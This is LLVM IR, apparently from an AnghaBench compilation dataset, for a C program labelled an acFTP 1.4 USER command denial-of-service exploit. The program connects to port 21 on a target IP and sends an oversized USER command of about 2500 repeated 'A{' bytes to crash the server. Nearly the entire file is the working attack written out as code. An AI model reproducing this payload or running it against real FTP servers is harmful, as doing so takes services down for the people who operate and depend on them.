; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1757.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1757.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [40 x i8] c"acFTP 1.4 USER Command - DoS Exploit!\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [46 x i8] c"Coded by OmniPresent - omnipresent@email.it\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"acFTP 1.4 - DoS Exploit!rn\00", align 1
@.str.3 = private unnamed_addr constant [47 x i8] c"Advisory: http://secunia.com/advisories/19978/\00", align 1
@.str.4 = private unnamed_addr constant [18 x i8] c"%s <IP_Address>\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@sock = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [15 x i8] c"Socket Error \0A\00", align 1
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [16 x i8] c"Connect Error \0A\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.9 = private unnamed_addr constant [18 x i8] c"DoS Attack Done!\0A\00", align 1
@wVersionRequested = common dso_local global i32 0, align 4
@wsaData = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2505 x i8], align 16
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* %4, align 4
  %11 = icmp ne i32 %10, 2
  br i1 %11, label %12, label %22

12:                                               ; preds = %2
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.3, i64 0, i64 0))
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* %19)
  %21 = call i32 @exit(i32 1) #3
  unreachable

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 1
  %25 = load i8*, i8** %24, align 8
  %26 = call i64 @inet_addr(i8* %25)
  store i64 %26, i64* %8, align 8
  %27 = load i32, i32* @AF_INET, align 4
  %28 = load i32, i32* @SOCK_STREAM, align 4
  %29 = call i32 @socket(i32 %27, i32 %28, i32 0)
  store i32 %29, i32* @sock, align 4
  %30 = load i32, i32* @INVALID_SOCKET, align 4
  %31 = icmp eq i32 %29, %30
  br i1 %31, label %32, label %35

32:                                               ; preds = %22
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0))
  %34 = call i32 @exit(i32 1) #3
  unreachable

35:                                               ; preds = %22
  %36 = call i32 @memset(%struct.sockaddr_in* %7, i32 48, i32 12)
  %37 = call i32 @htons(i32 21)
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %37, i32* %38, align 4
  %39 = load i32, i32* @AF_INET, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %39, i32* %40, align 4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %42 = call i32 @memcpy(i32* %41, i64* %8, i32 8)
  %43 = load i32, i32* @sock, align 4
  %44 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %45 = call i64 @connect(i32 %43, %struct.sockaddr* %44, i32 12)
  %46 = load i64, i64* @SOCKET_ERROR, align 8
  %47 = icmp eq i64 %45, %46
  br i1 %47, label %48, label %51

48:                                               ; preds = %35
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %50 = call i32 @exit(i32 1) #3
  unreachable

51:                                               ; preds = %35
  %52 = call i32 @sleep(i32 2)
  %53 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 0
  store i8 85, i8* %53, align 16
  %54 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 1
  store i8 83, i8* %54, align 1
  %55 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 2
  store i8 69, i8* %55, align 2
  %56 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 3
  store i8 82, i8* %56, align 1
  %57 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 4
  store i8 32, i8* %57, align 4
  store i32 5, i32* %9, align 4
  br label %58

58:                                               ; preds = %61, %51
  %59 = load i32, i32* %9, align 4
  %60 = icmp slt i32 %59, 2500
  br i1 %60, label %61, label %72

61:                                               ; preds = %58
  %62 = load i32, i32* %9, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 %63
  store i8 65, i8* %64, align 1
  %65 = load i32, i32* %9, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* %9, align 4
  %67 = load i32, i32* %9, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 %68
  store i8 123, i8* %69, align 1
  %70 = load i32, i32* %9, align 4
  %71 = add nsw i32 %70, 1
  store i32 %71, i32* %9, align 4
  br label %58

72:                                               ; preds = %58
  %73 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 0
  %74 = call i32 @strcat(i8* %73, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %75 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 0
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8* %75)
  %77 = load i32, i32* @sock, align 4
  %78 = getelementptr inbounds [2505 x i8], [2505 x i8]* %6, i64 0, i64 0
  %79 = call i32 @send(i32 %77, i8* %78, i32 2505, i32 0)
  %80 = load i32, i32* @sock, align 4
  %81 = call i32 @close(i32 %80)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.9, i64 0, i64 0))
  %83 = load i32, i32* %3, align 4
  ret i32 %83
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @memcpy(i32*, i64*, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
